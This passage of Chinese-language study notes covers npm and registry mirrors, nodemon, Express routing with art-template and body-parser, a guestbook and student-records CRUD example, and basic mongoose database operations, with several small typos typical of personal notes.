        <input type="text" class="form-control" required minlength="2" maxlength="10" id="input_name" name="name" placeholder="请写入你的姓名">
      </div>
      <div class="form-group">
        <label for="textarea_message">留言内容</label>
        <textarea class="form-control" name="message" id="textarea_message" cols="30" rows="10" required minlength="5" maxlength="20"></textarea>
      </div>
      <button type="submit" class="btn btn-default">发表</button>
    </form>
  </div>
</body>

</html>
```
[TOC]

 
>[success] # npm
```
1.全称node package manager
2.即是一个网站也是一个管理工具 
```
>[danger] ##### package.json
```
1.建议给每一个项目都配上 package.json 文件，这个文件主要记录这个项目
所用的 所有第三方包
2.在使用npm 的时候下载第三方包 npm install art-template -- save 结尾增加--
save，这样就会在package.json中怎加项目的依赖包记录记录在dependencies对应。
```
>[danger] ##### package-lock.json
```
1.下载速度快了
2.锁定版本
```
* 效果预览
```
{
  "name": "express-demo",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "keywords": [],
  "author": "",
  "license": "ISC",
  "dependencies": {
    "express": "^4.16.2"
  }
}
```
>[danger] ##### 常见的npm 指令
```
1.npm init   -- 生成配置文件package.json
    -- npm init  -y  可以跳过向导快速生成

2.npm install  -- 把配置文件中的package.json 第三方包全部安装 
     -- npm i  缩写

3.npn install 包名 -- 安装第三方包
    -- npm i  包名

4.npm install --save 包名 -- 下载第三方包并且保存在package.json中
     -- npm i -S 包名

5.npm uninstall 包名 -- 卸载第三方包
     -- npm un  包名

6.npm uninstall --save 包名 -- 卸载并且移除在package.json中的记录
    -- npm un -S 包名


7.npm help -- 显示帮助信息
```
>[danger] ##### 使用镜像
* 安装淘宝镜像
```
npm install --global cnpm
```
* 使用淘宝镜像
```
cnmp install jquery
```
* 使用淘宝镜像源  下面两种是不想下载淘宝的cnpm
```
npm install jquery --registry=https://registry.npm.taobao.org
```
* 直接更换地址
```
npm config set registry https://registry.npm.taobao.org
```
>[danger] ##### nrm的安装使用



```
作用：提供了一些最常用的NPM包镜像地址，能够让我们快速的切换安装包
时候的服务器地址； 什么是镜像：原来包刚一开始是只存在于国外的NPM
服务器，但是由于网络原因，经常访问不到，这时候，我们可以在国内，创
建一个和官网完全一样的NPM服务器，只不过，数据都是从人家那里拿过来
的，除此之外，使用方式完全一样；



```
```
1.运行npm i nrm -g全局安装nrm包；

2.使用nrm ls查看当前所有可用的镜像源地址以及当前所使用的镜像源地址；

3.使用nrm use npm或nrm use taobao切换不同的镜像源地址；

4.注意： nrm 只是单纯的提供了几个常用的 下载包的 URL地址，并能够让我们在 这几个 地址之间，很方便的进行切换，但是，我们每次装包的时候，使用的 装包工具，都是 npm
```
[TOC]
>[success] # 前期准备
```
1.配置一个自动重启服务器的配置文件,使用nodemon来帮我们解决修改代码
平凡重启服务器的问题，nodemon是基于Node.js 开发的第三方工具
2.只用通过nodemon 启动的服务，他会监视 你的文件变化，当文件变化的
时候帮你重启服务器
```
>[danger] ##### nodemon
* 安装
```
1.npm install --global nodemon
```
* 使用
``` 
// 正常启动是node app.js  替换下面方式启动
nodemon app.js
```
>[success] # Express 使用
```
1.npm init  -- 生成package.json
2.npm install express --save  --安装Express包
```
>[danger] ##### 简单的使用
```
1.npm init  -- 生成package.json
2.结构目录简单创建
3.调用express包
4.创建express服务器对象var app = express()
5.指定静态文件路径app.use('/public/', express.static('./public'))
6.使用路由映射app.get('请求网址'，function(req,res){   })
7.app.listen(3000, function () {}) 监听端口
```
```
// 引入node express 框架
var express = require('express')

// 创建服务器对象 等同于原来的http.createServer
var app = express()

// 指定静态路径
app.use('/public/', express.static('./public'))

//路由映射
app.get('/about',function (req, res) {
    console.log(req.query)
    res.send('你好，我是 Express!')
})


// 相当于 server.listen
app.listen(3000, function () {
    console.log('app is running at port 3000.')
})
```
* 也可以直接链式调用
```
app
  .get('/login', 函数)
  .get('/dsadsa', 函数)
  .post('/d/sadsa', 函数)
  .get('dsadsa', 函数)
```
>[danger] ##### 使用服务器模板 -- art-template
* 安装
```
// 因为是依赖关系所以要安装两个
// express-art-template 依赖了 art-template
npm install --save art-template
npm install --save express-art-template
```
* 配置
```
// 第一个参数表示渲染结尾文件后缀，第二个参数使用的模板
//express-art-template 和 art-template 的关系 是专门用来在 Express 中把 art-template 整合到 Express 中
app.engine('html', require('express-art-template'))
```
* 使用
```
1.当调用模板引擎的时候会默认提供一个render方法，用来处理模板
2.render 中的第一个参数是响应的html的路径，第二个参数是替换模板中的对应参数
3.其中默认会去项目中的 views 目录查找该模板文件
4.Express 有一个约定：开发人员把所有的视图文件都放到 views 目录中
```
* 更改指定存放html 路径文件夹
```
app.set('views', render函数的默认路径)
```
```
app.get('/', function (req, res) {
  res.render('index.html', {
    comments: comments
  })
})
```
>[danger] ##### 静态文件处理
```
1.使用use方法，其中两个参数，第一个是指定的客户端访问的地址，第
二个是公开访问的静态资源，例如下面的几种写法
2.app.use('/public/', express.static('./public/'))  // 通过指定前缀访问静态目录
3.app.use( express.static('./public/')) // 无需前缀直接访问public中的目录内容
4.app.use(express.static(path.join(__dirname, 'public'))) // 路径拼劲获取指定文件夹名称下所有内容
```
>[danger] ##### get/post 请求方式
```
1.请求方法
2.请求路径
3.请求处理函数
```
* get
```
app
  .get('/login', function(req,res){

    })
```
* post
```
app
  .post('/login', function(req,res){

    })
```
>[danger] ##### 获取get/post 参数
```
1.get 参数直接 req.query 得到的是一个字典
2.post参数需要先安装包 nmp install --save body-parse，
 引入包var bodyParser = require('body-parser')
```
* post 具体使用
```
var bodyParser = require('body-parser')


// 配置 body-parser 中间件（插件，专门用来解析表单 POST 请求体）
// parse application/x-www-form-urlencoded
app.use(bodyParser.urlencoded({ extended: false }))
// parse application/json
app.use(bodyParser.json())

app
  .post('/login', function(req,res){
            // 获取参数
         req.body
    })
```
>[success] ##### 具体的综合案例
```
1.npm init  --  创建package.json 记录文件
2.npm install express --save  --安装Express包
3.npm install --save art-template express-art-template -- 安装模板文件
4.npm install --save body-parse -- 安装post 解析文件
```
![](https://box.kancloud.cn/93bdbf7b00da053f748d8d130180ef8c_190x202.png)
>[danger] ##### views/index.html
```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>留言本</title>

</head>

<body>
  <div class="header container">
    <div class="page-header">
      <h1>Example page header <small>Subtext for header</small></h1>
      <a class="btn btn-success" href="/post">发表留言</a>
    </div>
  </div>
  <div class="comments container">
    <ul class="list-group">
      {{each comments}}
      <li class="list-group-item">{{ $value.name }}说：{{ $value.message }} <span class="pull-right">{{ $value.dateTime }}</span></li>
      {{/each}}
    </ul>
  </div>
</body>

</html>
```
>[danger] ##### views/post
```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Document</title>
</head>

<body>
  <div class="header container">
    <div class="page-header">
      <h1><a href="/">首页</a> <small>发表评论</small></h1>
    </div>
  </div>
  <div class="comments container">
    <form action="/comments" method="get">
      <div class="form-group">
        <label for="input_name">你的大名</label>
        <input type="text" class="form-control" required minlength="2" maxlength="10" id="input_name" name="name" placeholder="请写入你的姓名">
      </div>
      <div class="form-group">
        <label for="textarea_message">留言内容</label>
        <textarea class="form-control" name="message" id="textarea_message" cols="30" rows="10" required minlength="5" maxlength="20"></textarea>
      </div>
      <button type="submit" class="btn btn-default">发表</button>
    </form>
  </div>
</body>

</html>

```
>[danger] ##### app.js
```
// 等同于py 中import 导入包
var express = require('express')

// 创建 服务器
var app = express()

// 调用模板引擎
app.engine('html', require('express-art-template'))

// 指定静态文件目录
app.use('/public/',express.static('./public/'))



var comments = [{
    name: '张三',
    message: '今天天气不错！',
    dateTime: '2015-10-16'
},
]



// 路由映射
app.get('/',function (req, res) {

    res.render('index.html', {comments:comments})
})

app.get('/post', function (req, res) {

    res.render('post.html')
})

app.get('/comments', function (req, res) {

    // { name: '111', message: '111111' } 字典展示
    comment = req.query
    comment.dateTime = '2017-11-5 10:58:51'
    comments.unshift(req.query)

    res.redirect('/')
})

app.listen(3000,function () {
    console.log(12)
})
```
* 使用post
```
// 等同于py 中import 导入包
var express = require('express')
// 导入post处理包
var bodyParser = require('body-parser')

// 创建 服务器
var app = express()

// 调用模板引擎
app.engine('html', require('express-art-template'))

// 指定静态文件目录
app.use('/public/',express.static('./public/'))

// 配置post
app.use(bodyParser.urlencoded({ extended: false }))
app.use(bodyParser.json())


var comments = [{
    name: '张三',
    message: '今天天气不错！',
    dateTime: '2015-10-16'
},
]



// 路由映射
app.get('/',function (req, res) {

    res.render('index.html', {comments:comments})
})

app.get('/post', function (req, res) {

    res.render('post.html')
})

app.post('/comments', function (req, res) {

    // { name: '111', message: '111111' } 字典展示
    var comment = req.body
    console.log(comment)
    comment.dateTime = '2017-11-5 10:58:51'
    comments.unshift(req.body)

    res.redirect('/')
})

app.listen(3000,function () {
    console.log(12)
})
```
[TOC]
>[success] # 规划Express 结构目录
![](https://box.kancloud.cn/0f075e3aca3a69a4fda6fde10160b0ca_193x201.png)
```
1.app.js -- 文件入口目录
2.router -- 路由映射等同于django的url
3.设置api -- 利用回调函数处理异步
```
>[danger] ##### app.js -- 文件目录
* 作用
```
1.负责处理路由，根据api处理路由中项目思路简称配置文件包
2.模块职责要单一，不要乱写
3.我们划分模块的目的就是为了增强项目代码的可维护性
4.提升开发效率
```
* 开始前的准备安装的东西
```
1.npm init  --  创建package.json 记录文件
2.npm install express --save  --安装Express包
3.npm install --save art-template express-art-template -- 安装模板文件
4.npm install --save body-parse -- 安装post 解析文件
```
* 代码结构讲解
```
1. 引入对应的几个 常用包例如
  var express = require('express')     -- express 框架包
  var bodyParser = require('body-parser') -- 处理post 请求的包
  var router = require(dirPath('router')) -- 引入路由映射，路由映射自己编写的包
2.路由的导入思路两种一种是利用方法封装调用，一种是用自带的路由处理
函数调用 具体看router.js 文件的讲解
```
```
var path = require('path');

// 自定义的配置目录方法
var dirPath = function (dirName) {
    return path.join(__dirname, dirName)
}

// 相当于import 导入包
var express = require('express')
var bodyParser = require('body-parser')
var router = require(dirPath('router'))


// 使用express 框架
var app = express()

//指定读取views 目录下的后缀文件默认art
app.engine('html', require('express-art-template'))
// 配置模板引擎和 body-parser 一定要在 app.use(router) 挂载路由之前
app.use(bodyParser.urlencoded({extended: false}))
app.use(bodyParser.json())


// 配置 静态访问的路径 目前猜测可以不用具体路径./node_modules/ 格式
app.use('/node_modules/', express.static('node_modules'))
app.use('/public/', express.static(dirPath('public')))

// 路由配置导入
router(app)

app.listen(3000, function () {
    console.log('app is running at port 3000.')
})
```
* 使用express 自带路由映射函数
```
var path = require('path');

// 自定义的配置目录方法
var dirPath = function (dirName) {
    return path.join(__dirname, dirName)
}

// 相当于import 导入包
var express = require('express')
var bodyParser = require('body-parser')
var router = require(dirPath('router'))


// 使用express 框架
var app = express()

//指定读取views 目录下的后缀文件默认art
app.engine('html', require('express-art-template'))
// 配置模板引擎和 body-parser 一定要在 app.use(router) 挂载路由之前
app.use(bodyParser.urlencoded({extended: false}))
app.use(bodyParser.json())


// 配置 静态访问的路径 目前猜测可以不用具体路径./node_modules/ 格式
app.use('/node_modules/', express.static('node_modules'))
app.use('/public/', express.static(dirPath('public')))

// 路由配置导入
// 把路由容器挂载到 app 服务中
app.use(router)


app.listen(3000, function () {
    console.log('app is running at port 3000.')
})


```
>[danger] ##### router.js 路由配置
```
1.根据不同的请求方法+请求路径设置具体的请求处理函数
2.在 app.js 调用入口函数中引入router文件，使用封装好的方法，传入
express 对象
```
* 自定义封装方法 调用路由函数
```

// 调用自定义的路由函数
var studetns = require('./students')

// 使用module.exports 方便app.js 调用路由映射
module.exports = function (app) {
    app.get('/',function (req,res) {

        // 调用api 处理逻辑内容
        studetns.find(function (err,students) {
            if(err){
                return res.status(500).send('Server error.')
            }// end if
            return res.render('index.html', {
                fruits: [
                    '苹果',
                    '香蕉',
                    '橘子'
                ],
                students: students
            }) // end render
        })// end students
    })
}
```
* 使用提供的 api 调用路由函数
```
1.在router 路由函数中调用var express = require('express') 函数使用express.Router()创建路由
2.使用express.Router() 调用get，post 请求函数
3.在路由文件中最后 到处module.exports = router，router对象
4.在app.js 中，使用app.use 调用返回的对象 形成路由映射关系
```
```
// 调用自定义的路由函数
var studetns = require('./students')

var express = require('express')

// 1. 创建一个路由容器
var router = express.Router()


router.get('/', function (req, res) {

    // 调用api 处理逻辑内容
    studetns.find(function (err, students) {
        if (err) {
            return res.status(500).send('Server error.')
        }// end if
        return res.render('index.html', {
            fruits: [
                '苹果',
                '香蕉',
                '橘子'
            ],
            students: students
        }) // end render
    })// end students
})

// 3. 把 router 导出
module.exports = router
```
>[success] # 用回调思想处理异步
```
1.异步在不确定的时间点出发函数内部，所以思路就是在内部就处理，异步，让参数成为异步函数的内部
```
*  小的案例处理setTimeout函数
```
//处理异步的时候，当异步触发内部函数时在触发整体
function fn(callback) {
    setTimeout(function () {
        var num =1
        callback(num)
    },1000)
}

var a = fn(function (data) {
    console.log(1)

})
```
>[danger] ##### students.js -- api的编写
```
1.因为fs 模块是异步所以用回调函数进行封装调用
2.职责：操作文件中的数据，只处理数据，不关心业务
```
```
var fs = require('fs')

var dbPath = './db.json'

exports.find = function (callback) {
    fs.readFile(dbPath,'utf-8',function (err, data) {
        if(err){
            return callback(err)
        }
        callback(null, JSON.parse(data).students)
    })
}
```
[TOC]
>[success] # 学生信息增删改查
```
1.如果喜欢简写if(){}else{} 格式 记得要在if中加return 例如 if(){return } 
console.log(),就是说if内成功就不执行下面的代码
2.使用splice 删除数组对象更佳，使用find 查询数组内容并且返回
```
![](https://box.kancloud.cn/a460abb15cf5f7d8526a7e4cc08a0e59_205x252.png)
>[danger] ##### url 设计
| 请求方法 |     请求路径     | get 参数 |           post 参数            |       备注       |
|----------|------------------|----------|--------------------------------|------------------|
| GET      | /studens         |          |                                | 渲染首页         |
| GET      | /students/new    |          |                                | 渲染添加学生页面 |
| POST     | /studens/new     |          | name、age、gender、hobbies     | 处理添加学生请求 |
| GET      | /students/edit   | id       |                                | 渲染编辑页面     |
| POST     | /studens/edit    |          | id、name、age、gender、hobbies | 处理编辑请求     |
| GET      | /students/delete | id       |                                | 处理删除请求     |
|          |                  |          |                                |                  |
>[danger] ##### views/html 
* index.html首页
```
<!DOCTYPE html>
<html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <!-- 上述3个meta标签*必须*放在最前面，任何其他内容都*必须*跟随其后！ -->
  <meta name="description" content="">
  <meta name="author" content="">
  <link rel="icon" href="../../favicon.ico">
  <title>Dashboard Template for Bootstrap</title>
  <!-- Bootstrap core CSS -->
  <link href="/node_modules/bootstrap/dist/css/bootstrap.min.css" rel="stylesheet">
  <!-- Custom styles for this template -->
  <link href="/public/css/main.css" rel="stylesheet">
</head>
s
<body>
<div class="container-fluid">
  <div class="row" >
    <div class="col-sm-9 col-sm-offset-3 col-md-10 col-md-offset-2 main" style="margin: 0 auto">
      <h1 class="page-header">Dashboard</h1>
      <div class="row placeholders" tyle="margin: 0 auto">
        {{ each fruits }}
        <div class="col-xs-6 col-sm-3 placeholder">
          <img src="data:image/gif;base64,R0lGODlhAQABAIAAAHd3dwAAACH5BAAAAAAALAAAAAABAAEAAAICRAEAOw==" width="200" height="200" class="img-responsive" alt="Generic placeholder thumbnail">
          <h4>{{ $value }}</h4>
          <span class="text-muted">Something else</span>
        </div>
        {{ /each }}
      </div>
      <h2 class="sub-header">Section title</h2>
      <a class="btn btn-success" href="/students/new">添加学生</a>
      <div class="table-responsive">
        <table class="table table-striped">
          <thead>
          <tr>
            <th>#</th>
            <th>姓名</th>
            <th>性别</th>
            <th>年龄</th>
            <th>爱好</th>
            <th>操作</th>
          </tr>
          </thead>
          <tbody>
          {{students}}
          {{ each students }}
          <tr>
            <td>{{ $value.id }}</td>
            <td>{{ $value.name }}</td>
            <td>{{ $value.gender }}</td>
            <td>{{ $value.age }}</td>
            <td>{{ $value.hobbies }}</td>
            <td>
              <a href="/students/edit?id={{ $value.id }}">编辑</a>
              <a href="/students/delete?id={{ $value.id }}">删除</a>
            </td>
          </tr>
          {{ /each }}
          </tbody>
        </table>
      </div>
    </div>
  </div>
</div>
</body>

</html>

```
* edit.html 编辑页
```
<!DOCTYPE html>
<html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <!-- 上述3个meta标签*必须*放在最前面，任何其他内容都*必须*跟随其后！ -->
  <meta name="description" content="">
  <meta name="author" content="">
  <link rel="icon" href="../../favicon.ico">
  <title>Dashboard Template for Bootstrap</title>
  <!-- Bootstrap core CSS -->
  <link href="/node_modules/bootstrap/dist/css/bootstrap.min.css" rel="stylesheet">

</head>

<body>
  <div class="container-fluid">
    <div class="row">
      <div class="col-sm-9 col-sm-offset-3 col-md-10 col-md-offset-2 main">
        <h2 class="sub-header">添加学生</h2>
        <form action="/students/edit" method="post">
          <!-- 
            用来放一些不希望被用户看见，但是需要被提交到服务端的数据
           -->
          <input type="hidden" name="id" value="{{ student.id }}">
          <div class="form-group">
            <label for="">姓名</label>
            <input type="text" class="form-control" id="" name="name" required minlength="2" maxlength="10" value="{{ student.name }}">
          </div>
          <div class="form-group">
            <label for="">性别</label>
            <div>
              <label class="radio-inline">
                <input type="radio" name="gender" id="" value="0" checked> 男
              </label>
              <label class="radio-inline">
                <input type="radio" name="gender" id="" value="1"> 女
              </label>
            </div>
          </div>
          <div class="form-group">
            <label for="">年龄</label>
            <input class="form-control" type="number" id="" name="age" value="{{ student.age }}" required min="1" max="150">
          </div>
          <div class="form-group">
            <label for="">爱好</label>
            <input class="form-control" type="text" id="" name="hobbies" value="{{ student.hobbies }}">
          </div>
          <button type="submit" class="btn btn-default">Submit</button>
        </form>
      </div>
    </div>
  </div>
</body>

</html>

```
* new.html 增加
```
<!DOCTYPE html>
<html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="">
  <meta name="author" content="">
  <link rel="icon" href="../../favicon.ico">
  <link href="/node_modules/bootstrap/dist/css/bootstrap.min.css" rel="stylesheet">
</head>

<body>
<div class="container-fluid">
  <div class="row">
    <div class="col-sm-9 col-sm-offset-3 col-md-10 col-md-offset-2 main">
      <h2 class="sub-header">添加学生</h2>
      <form action="/students/new" method="post">
        <div class="form-group">
          <label for="">姓名</label>
          <input type="text" class="form-control" id="" name="name" required minlength="2" maxlength="10">
        </div>
        <div class="form-group">
          <label for="">性别</label>
          <div>
            <label class="radio-inline">
              <input type="radio" name="gender" id="" value="0" checked> 男
            </label>
            <label class="radio-inline">
              <input type="radio" name="gender" id="" value="1"> 女
            </label>
          </div>
        </div>
        <div class="form-group">
          <label for="">年龄</label>
          <input class="form-control" type="number" id="" name="age" required min="1" max="150">
        </div>
        <div class="form-group">
          <label for="">爱好</label>
          <input class="form-control" type="text" id="" name="hobbies">
        </div>
        <button type="submit" class="btn btn-default">Submit</button>
      </form>
    </div>
  </div>
</div>
</body>

</html>

```
>[danger] ##### app.js 入口页
```
var path = require('path');

// 自定义的配置目录方法
var dirPath = function (dirName) {
    return path.join(__dirname, dirName)
}

// 相当于import 导入包
var express = require('express')
var bodyParser = require('body-parser')
var router = require(dirPath('router'))


// 使用express 框架
var app = express()

//指定读取views 目录下的后缀文件默认art
app.engine('html', require('express-art-template'))
// 配置模板引擎和 body-parser 一定要在 app.use(router) 挂载路由之前
app.use(bodyParser.urlencoded({extended: false}))
app.use(bodyParser.json())


// 配置 静态访问的路径 目前猜测可以不用具体路径./node_modules/ 格式
app.use('/node_modules/', express.static('node_modules'))
app.use('/public/', express.static(dirPath('public')))

// 路由配置导入
// 把路由容器挂载到 app 服务中
app.use(router)


app.listen(3000, function () {
    console.log('app is running at port 3000.')
})


```
>[danger] ##### router 路由页
```
/**
 * router.js 路由模块
 * 职责：
 *   处理路由
 *   根据不同的请求方法+请求路径设置具体的请求处理函数
 * 模块职责要单一，不要乱写
 * 我们划分模块的目的就是为了增强项目代码的可维护性
 * 提升开发效率
 */

var fs = require('fs')
var Student = require('./student')

// Express 提供了一种更好的方式
// 专门用来包装路由的
var express = require('express')

// 1. 创建一个路由容器
var router = express.Router()

// 2. 把路由都挂载到 router 路由容器中

/*
 * 渲染学生列表页面
 */
router.get('/students', function (req, res) {
  Student.find(function (err, students) {
    if (err) {
      return res.status(500).send('Server error.')
    }
    res.render('index.html', {
      fruits: [
        '苹果',
        '香蕉',
        '橘子'
      ],
      students: students
    })
  })
})

/*
 * 渲染添加学生页面
 */
router.get('/students/new', function (req, res) {
  res.render('new.html')
})

/*
 * 处理添加学生
 */
router.post('/students/new', function (req, res) {
  // 1. 获取表单数据
  // 2. 处理
  //    将数据保存到 db.json 文件中用以持久化
  // 3. 发送响应
  Student.save(req.body, function (err) {
    if (err) {
      return res.status(500).send('Server error.')
    }
    res.redirect('/students')
  })
})

/*
 * 渲染编辑学生页面
 */
router.get('/students/edit', function (req, res) {
  // 1. 在客户端的列表页中处理链接问题（需要有 id 参数）
  // 2. 获取要编辑的学生 id
  // 
  // 3. 渲染编辑页面
  //    根据 id 把学生信息查出来
  //    使用模板引擎渲染页面

  Student.findById(parseInt(req.query.id), function (err, student) {
    if (err) {
      return res.status(500).send('Server error.')
    }
    res.render('edit.html', {
      student: student
    })
  })
})

/*
 * 处理编辑学生
 */
router.post('/students/edit', function (req, res) {
  // 1. 获取表单数据
  //    req.body
  // 2. 更新
  //    Student.updateById()
  // 3. 发送响应
  Student.updateById(req.body, function (err) {
    if (err) {
      return res.status(500).send('Server error.')
    }
    res.redirect('/students')
  })
})

/*
 * 处理删除学生
 */
router.get('/students/delete', function (req, res) {
  // 1. 获取要删除的 id
  // 2. 根据 id 执行删除操作
  // 3. 根据操作结果发送响应数据

  Student.deleteById(req.query.id, function (err) {
    if (err) {
      return res.status(500).send('Server error.')
    }
    res.redirect('/students')
  })
})

// 3. 把 router 导出
module.exports = route
```
>[danger] ##### studnets -- 处理数据
```
/**
 * student.js
 * 数据操作文件模块
 * 职责：操作文件中的数据，只处理数据，不关心业务
 *
 * 这里才是我们学习 Node 的精华部分：奥义之所在
 * 封装异步 API
 */

var fs = require('fs')

var dbPath = './db.json'

/**
 * 获取学生列表
 * @param  {Function} callback 回调函数
 */
exports.find = function (callback) {
  fs.readFile(dbPath, 'utf8', function (err, data) {
    if (err) {
      return callback(err)
    }
    callback(null, JSON.parse(data).students)
  })
}

/**
 * 根据 id 获取学生信息对象
 * @param  {Number}   id       学生 id
 * @param  {Function} callback 回调函数
 */
exports.findById = function (id, callback) {
  fs.readFile(dbPath, 'utf8', function (err, data) {
    if (err) {
      return callback(err)
    }
    var students = JSON.parse(data).students
    var ret = students.find(function (item) {
      return item.id === parseInt(id)
    })
    callback(null, ret)
  })
}

/**
 * 添加保存学生
 * @param  {Object}   student  学生对象
 * @param  {Function} callback 回调函数
 */
exports.save = function (student, callback) {
  fs.readFile(dbPath, 'utf8', function (err, data) {
    if (err) {
      return callback(err)
    }
    var students = JSON.parse(data).students

    // 添加 id ，唯一不重复
    student.id = students[students.length - 1].id + 1

    // 把用户传递的对象保存到数组中
    students.push(student)

    // 把对象数据转换为字符串
    var fileData = JSON.stringify({
      students: students
    })

    // 把字符串保存到文件中
    fs.writeFile(dbPath, fileData, function (err) {
      if (err) {
        // 错误就是把错误对象传递给它
        return callback(err)
      }
      // 成功就没错，所以错误对象是 null
      callback(null)
    })
  })
}

/**
 * 更新学生
 */
exports.updateById = function (student, callback) {
  fs.readFile(dbPath, 'utf8', function (err, data) {
    if (err) {
      return callback(err)
    }
    var students = JSON.parse(data).students

    // 注意：这里记得把 id 统一转换为数字类型
    student.id = parseInt(student.id)

    // 你要修改谁，就需要把谁找出来
    // EcmaScript 6 中的一个数组方法：find
    // 需要接收一个函数作为参数
    // 当某个遍历项符合 item.id === student.id 条件的时候，find 会终止遍历，同时返回遍历项
    var stu = students.find(function (item) {
      return item.id === student.id
    })

    // 这种方式你就写死了，有 100 个难道就写 100 次吗？
    // stu.name = student.name
    // stu.age = student.age

    // 遍历拷贝对象
    for (var key in student) {
      stu[key] = student[key]
    }

    // 把对象数据转换为字符串
    var fileData = JSON.stringify({
      students: students
    })

    // 把字符串保存到文件中
    fs.writeFile(dbPath, fileData, function (err) {
      if (err) {
        // 错误就是把错误对象传递给它
        return callback(err)
      }
      // 成功就没错，所以错误对象是 null
      callback(null)
    })
  })
}

/**
 * 删除学生
 */
exports.deleteById = function (id, callback) {
  fs.readFile(dbPath, 'utf8', function (err, data) {
    if (err) {
      return callback(err)
    }
    var students = JSON.parse(data).students

    // findIndex 方法专门用来根据条件查找元素的下标
    var deleteId = students.findIndex(function (item) {
      return item.id === parseInt(id)
    })

    // 根据下标从数组中删除对应的学生对象
    students.splice(deleteId, 1)

    // 把对象数据转换为字符串
    var fileData = JSON.stringify({
      students: students
    })

    // 把字符串保存到文件中
    fs.writeFile(dbPath, fileData, function (err) {
      if (err) {
        // 错误就是把错误对象传递给它
        return callback(err)
      }
      // 成功就没错，所以错误对象是 null
      callback(null)
    })
  })
}


```
>[success] # 使用NODE的mongoose
```
1.使用mongoose 连接Node和mongodb
2.具体的去官网查
```
>[danger] ##### 安装
```
npm i mongoose --save
```
>[danger] ##### 简单的使用
```
1.useMongoClient: true 使用后提示WARNING: The `useMongoClient` 
option is no longer necessary in mongoose 5.x, please remove it.
2.第一步引入mongoose 包
3.第二步连接数据库
4.第三步创建表的模型
5.第四步创建表的实例化对象传入添加数据
6.第五步通过save 实例化对象保存数据
```
```
// 引入 mongoose 文件
var mongoose = require('mongoose')

// 创建连接MongDB数据库mongoose.connect('mongodb://localhost/test',{ useMongoClient: true })
// 其中test 就是数据库，mongo的特性就是用创建数据库在创建表，库会根据表自动创建
mongoose.connect('mongodb://localhost/test')
mongoose.Promise = global.Promise;

//创建一个模型
// 就是在设计数据库
// MongoDB 是动态的，非常灵活，只需要在代码中设计你的数据库就可以了
// 其中Cat 就是表也就是集合的概念，实际后台创建显示cats 集合也就是表
var Cat = mongoose.model('Cat', { name: String });

// 创建数据也就是实例化对象
var kitty = new Cat({ name: '喵喵' });

// 持久化保存 kitty 实例
kitty.save(function (err) {
    if (err) {
        console.log(err);
    } else {
        console.log('meow');
    }
});
```

>[danger] ##### 看这个官方指南
```
1.引入mongoose
2.创建图表结构对象
3.连接数据库
4.设计文档结构
5.将文档结构发布为模型
```
```
var mongoose = require('mongoose')

// 设计图表结构
var Schema = mongoose.Schema

// 1. 连接数据库
// 指定连接的数据库不需要存在，当你插入第一条数据之后就会自动被创建出来
mongoose.connect('mongodb://localhost/itcast')

// 2. 设计文档结构（表结构）
// 字段名称就是表结构中的属性名称
// 约束的目的是为了保证数据的完整性，不要有脏数据
var userSchema = new Schema({
  username: {
    type: String,
    required: true // 必须有
  },
  password: {
    type: String,
    required: true
  },
  email: {
    type: String
  }
})

// 3. 将文档结构发布为模型
//    mongoose.model 方法就是用来将一个架构发布为 model
//    第一个参数：传入一个大写名词单数字符串用来表示你的数据库名称
//                 mongoose 会自动将大写名词的字符串生成 小写复数 的集合名称
//                 例如这里的 User 最终会变为 users 集合名称
//    第二个参数：架构 Schema
//   
//    返回值：模型构造函数
var User = mongoose.model('User', userSchema)
```
>[danger] ##### 保存数据save 方法
```
1.给集合对象传入保存对象，使用save保存，调用save的回调函数
2.回调函数第一个参数是返回错误信息，第二个是返回保存成功的数据
```
```
var admin = new User({
  username: 'zs',
  password: '123456',
  email: 'admin@admin.com'
})

admin.save(function (err, ret) {
  if (err) {
    console.log('保存失败')
  } else {
    console.log('保存成功')
    console.log(ret)
  }
})
```
>[danger] ##### 查询数据find
* 查询全部 find 返回的是一个数组
```
User.find(function (err, ret) {
  if (err) {
    console.log('查询失败')
  } else {
    console.log(ret)
  }
})
```
* 按条件查询find 第一个参数是查询条件
```
User.find({
  username: 'zs'
}, function (err, ret) {
  if (err) {
    console.log('查询失败')
  } else {
    console.log(ret)
  }
})
```
* 只查询单个符合内容findOne
```
User.findOne({
  username: 'zs'
}, function (err, ret) {
  if (err) {
    console.log('查询失败')
  } else {
    console.log(ret)
  }
})
```
>[danger] #### 删除数据
* 根据条件删除
```
User.remove({
  username: 'zs'
}, function (err, ret) {
  if (err) {
    console.log('删除失败')
  } else {
    console.log('删除成功')
    console.log(ret)
  }
})
```
>[danger] ##### 更改数据
* 根据id更改数据 findByIdAndUpdate，第一个参数id，第二个是要更改的你内容，第三个是回调函数
```
User.findByIdAndUpdate('5a001b23d219eb00c8581184', {
  password: '123'
}, function (err, ret) {
  if (err) {
    console.log('更新失败')
  } else {
    console.log('更新成功')
  }
})
```
 >[success] # 把学生管理案例配合数据库
```
1.需要重写student.js
2.重新处理router 业务逻辑层面代码
```
>[danger] #####student.js
```
var mongoose = require('mongoose')

mongoose.connect('mongodb://localhost/itcast', { useMongoClient: true })

var Schema = mongoose.Schema

var studentSchema = new Schema({
  name: {
    type: String,
    required: true
  },
  gender: {
    type: Number,
    enum: [0, 1],
    default: 0
  },
  age: {
    type: Number
  },
  hobbies: {
    type: String
  }
})

// 直接导出模型构造函数
module.exports = mongoose.model('Student', studentSchema)

```
>[danger] ##### 重新编写router.js
```
/**
 * router.js 路由模块
 * 职责：
 *   处理路由
 *   根据不同的请求方法+请求路径设置具体的请求处理函数
 * 模块职责要单一，不要乱写
 * 我们划分模块的目的就是为了增强项目代码的可维护性
 * 提升开发效率
 */

var fs = require('fs')
var Student = require('./student')

// Express 提供了一种更好的方式
// 专门用来包装路由的
var express = require('express')

// 1. 创建一个路由容器
var router = express.Router()

